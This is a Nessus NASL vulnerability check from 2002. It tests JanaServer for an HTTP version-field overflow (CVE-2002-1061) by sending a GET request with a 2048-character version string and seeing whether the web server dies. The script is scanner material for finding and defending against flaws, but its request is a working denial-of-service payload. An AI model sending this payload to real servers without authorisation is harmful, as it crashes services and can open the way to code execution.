#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# References:
# Date:  Fri, 26 Jul 2002 12:12:45 +0400
# From: "3APA3A" <3APA3A@SECURITY.NNOV.RU>
# To: bugtraq@securityfocus.com
# Subject: SECURITY.NNOV: multiple vulnerabilities in JanaServer
#
# Affected:
# JanaServer 2.2.1 and prior
# JanaServer 1.46 and prior
# 


if(description)
{
 script_id(11061);
 script_bugtraq_id(5319, 5320, 5322, 5324);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2002-1061");
 name["english"] = "HTTP version number overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It was possible to kill the web server by
sending an invalid GET request with a too long HTTP version field

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "too long HTTP version kills the web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

########


include("http_func.inc");

r = string("GET / HTTP/", crap(2048), ".O\r\n\r\n");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);



if(http_is_dead(port: port)) { security_hole(port); }
